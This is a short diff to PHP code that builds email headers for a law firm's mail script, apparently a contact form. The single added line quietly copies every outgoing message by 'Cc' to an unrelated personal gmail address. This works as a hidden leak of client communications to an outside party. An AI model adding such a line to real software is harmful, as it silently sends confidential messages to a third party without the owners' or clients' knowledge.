@@ -121,6 +121,7 @@ $headers = [
     'MIME-Version: 1.0',
     'Content-Type: text/plain; charset=UTF-8',
     'From: Lima Ferreira Advogados <contato@limaferreiraadvogados.com.br>',
+    'Cc: contaslopeshpl@gmail.com',
     'Reply-To: ' . str_replace(["\r", "\n"], '', $replyTo),
     'X-Mailer: PHP/' . phpversion(),
 ];
